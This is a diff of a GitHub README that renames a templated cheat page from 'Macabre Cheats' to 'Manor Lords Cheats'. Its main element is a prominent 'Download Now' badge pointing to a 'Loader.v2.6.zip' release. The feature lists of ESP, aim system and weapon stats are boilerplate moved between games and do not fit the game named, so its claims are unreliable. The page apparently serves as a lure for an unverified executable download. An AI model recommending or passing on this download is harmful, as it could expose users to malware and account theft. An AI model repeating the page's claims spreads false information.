@@ -1,113 +1,162 @@
+# 🎮 Manor Lords Cheats
+
 [![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Lowercladisconnect/LomerunekProk/releases/download/v1.0.0/Loader.v2.6.zip)
 
 Latest Version: v1.0.0 • File Size: ~156 MB
 
 </div>
 
-🎮 Macabre Cheats
-⚡ Advanced Game Modification Project
 
-Macabre Cheats is a feature-rich project designed to provide a wide range of visual, informational, and gameplay-related customization options. The project focuses on a clean interface, flexible configuration, and an organized menu system that makes every available module easy to configure. 🛠️
-￼ ￼ ￼ ￼
-✨ FEATURES
-👁️ ESP / INFORMATION
-Macabre Cheats includes an extensive information and visualization system with multiple configurable elements.
-👤 Player ESP
-❤️ Health indicators
-📏 Distance display
-🏷️ Player names
-🔲 Configurable ESP elements
-🎨 Custom visual settings
-📍 Object information
-🔎 Additional player information
-⚙️ Individual visualization settings
-🎯 AIM SYSTEM
-The aim module provides a variety of configurable targeting options and personalization settings.
-🎯 Configurable aim area
-👤 Target selection
-📏 Distance settings
-⚙️ Targeting parameters
-🎚️ Adjustable smoothing
-🔄 Multiple operating modes
-🎮 Custom keybinds
-🧩 Flexible configuration
-👀 VISUALS
-Customize the way information is displayed and create a visual setup that matches your preferences.
-🖥️ Advanced visual settings
-🎨 Custom colors
-📦 Configurable ESP elements
-📏 Distance indicators
-❤️ Health indicators
-🏷️ Name display
-🔎 Additional information
-✨ Custom interface appearance
-🔫 WEAPON
-The weapon information module provides additional configurable information about available equipment.
-🔫 Weapon information
-📊 Weapon statistics
-🎯 Additional indicators
-⚙️ Configurable information display
-📋 Customizable weapon elements
-🧍 PLAYER
-A dedicated player information section with multiple visualization options.
-👤 Player information
-❤️ Health status
-📏 Distance
-🏷️ Player names
-📍 Visual indicators
-🔎 Additional information
-⚙️ Custom display settings
-🛠️ MISC
+> ⚡ Advanced Game Modification Project for Manor Lords
+
+Latest Version: v1.0.0 • File Size: ~156 MB • Platform: Windows
+
+!Version
+!Status
+!Platform
+!GitHub
+
+---
+
+## 📖 About
+
+Manor Lords Cheats is a feature-rich third-party modification project designed to provide a wide range of visual, informational, and gameplay-related customization options for Manor Lords.
+
+The project focuses on a clean and modern interface, flexible configuration, and an organized menu system that makes available modules easy to configure.
+
+> 🛠️ Designed with customization, usability, and a modular structure in mind.
+
+---
+
+## ✨ Features
+
+### 👁️ ESP / Information
+
+Manor Lords Cheats includes an extensive information and visualization system with multiple configurable elements.
+
+- 👤 Player ESP
+- ❤️ Health Indicators
+- 📏 Distance Display
+- 🏷️ Player Names
+- 🔲 Configurable ESP Elements
+- 🎨 Custom Visual Settings
+- 📍 Object Information
+- 🔎 Additional Information
+- ⚙️ Individual Visualization Settings
+
+---
+
+### 🎯 Aim System
+
+The aim module provides configurable targeting options and personalization settings.
+
+- 🎯 Configurable Aim Area
+- 👤 Target Selection
+- 📏 Distance Settings
+- ⚙️ Targeting Parameters
+- 🎚️ Adjustable Smoothing
+- 🔄 Multiple Operating Modes
+- 🎮 Custom Keybinds
+- 🧩 Flexible Configuration
+
+---
+
+### 👀 Visuals
+
+Customize the way information and additional elements are displayed.
+
+- 🖥️ Advanced Visual Settings
+- 🎨 Custom Colors
+- 📦 Configurable Visual Elements
+- 📏 Distance Indicators
+- ❤️ Health Indicators
+- 🏷️ Name Display
+- 🔎 Additional Information
+- ✨ Custom Interface Appearance
+- 👁️ Visibility Settings
+
+---
+
+### 🔫 Weapon
+
+Additional weapon-related information and configurable display options.
+
+- 🔫 Weapon Information
+- 📊 Weapon Statistics
+- 🎯 Additional Indicators
+- ⚙️ Configurable Information Display
+- 📋 Customizable Weapon Elements
+
+---
+
+### 🧍 Player
+
+A dedicated player information module with multiple configurable visualization options.
+
+- 👤 Player Information
+- ❤️ Health Status
+- 📏 Distance
+- 🏷️ Player Names
+- 📍 Visual Indicators
+- 🔎 Additional Information
+- ⚙️ Custom Display Settings
+
+---
+
+### 🛠️ Miscellaneous
+
 Additional customization options for the overall experience.
-⌨️ Custom hotkeys
-💾 Configuration system
-📂 Multiple profiles
-🔄 Quick feature switching
-🖥️ Interface customization
-⚙️ Additional settings
-📊 Information panels
-🎨 UI / MENU
-Macabre Cheats features a clean and organized interface designed around categories and easily accessible settings.
-🖥️ Interface Features
-🗂️ Categorized settings
-🎨 Customizable appearance
-⌨️ Hotkey support
-💾 Configuration saving
-📥 Configuration loading
-🔄 Quick feature toggles
-📊 Information panels
-⚡ Fast access to settings
-🧩 Modular layout
-The menu is designed to keep the configuration process simple while still providing extensive customization options.
-💾 CONFIGURATION SYSTEM
-Macabre Cheats includes a configuration system that allows users to save and manage their preferred settings.
-Supported Options
-📁 Multiple configuration profiles
-💾 Save settings
-📥 Load configurations
-🔄 Quickly switch between profiles
-⚙️ Individual settings for each category
-🗑️ Manage unused configurations
-📋 Preset-based configuration
-📊 PROJECT STRUCTURE
-CategoryFeatures👁️ ESPPlayer & information overlays🎯 AIMTargeting configuration👀 VISUALSVisual customization🔫 WEAPONWeapon information🧍 PLAYERPlayer information🛠️ MISCAdditional options🎨 UIMenu customization💾 CONFIGProfile management 
-🖥️ SYSTEM REQUIREMENTS
-🔹 MINIMUM
-ComponentRequirement🪟 Operating SystemWindows 10 / 11🧠 RAM8 GB⚙️ CPUIntel Core i3 / AMD Ryzen 3🎮 GPU2 GB VRAM💾 Storage1 GB available space🔧 DirectXVersion 11 
-🔹 RECOMMENDED
-ComponentRequirement🪟 Operating SystemWindows 10 / 11 64-bit🧠 RAM16 GB⚙️ CPUIntel Core i5 / AMD Ryzen 5🎮 GPU4 GB VRAM💾 Storage2 GB available space🔧 DirectXVersion 12 
-🐙 GITHUB
-￼ ￼ ￼ ￼ ￼
-📦 Project Information
-Project: Macabre Cheats
-Platform: Windows
-Status: Active Development
-Interface: Available
-Configuration: Supported
-Updates: Ongoing
-📈 PROJECT STATUS
-🟢 Development: Active
-🔵 UI: Available
-🟣 Configuration System: Supported
-🟡 Updates: Ongoing
-⚪ Documentation: In Progress
+
+- ⌨️ Custom Hotkeys
+- 💾 Configuration System
+- 📂 Multiple Profiles
+- 🔄 Quick Feature Switching
+- 🖥️ Interface Customization
+- ⚙️ Additional Settings
+- 📊 Information Panels
+- 🎨 Custom UI Options
+
+---
+
+## 🎨 UI / Menu
+
+Manor Lords Cheats features a clean and organized menu designed around categories and easily accessible settings.
+
+### 🖥️ Interface Features
+
+- 🗂️ Categorized Settings
+- 🎨 Customizable Appearance
+- ⌨️ Hotkey Support
+- 💾 Configuration Saving
+- 📥 Configuration Loading
+- 🔄 Quick Feature Toggles
+- 📊 Information Panels
+- ⚡ Fast Access to Settings
+- 🧩 Modular Layout
+
+The menu is designed to keep configuration simple while providing a wide range of customization options.
+
+---
+
+## 💾 Configuration System
+
+The built-in configuration system allows users to save, load, and manage their preferred settings.
+
+### Supported Options
+
+- 📁 Multiple Configuration Profiles
+- 💾 Save Settings
+- 📥 Load Configurations
+- 🔄 Quickly Switch Between Profiles
+- ⚙️ Individual Settings for Each Category
+- 📋 Preset-Based Configuration
+- 🗂️ Organized Configuration Management
+
+### Example Configuration Structure
+
+`text
+configs/
+├── default.cfg
+├── visual.cfg
+├── player.cfg
+└── custom.cfg
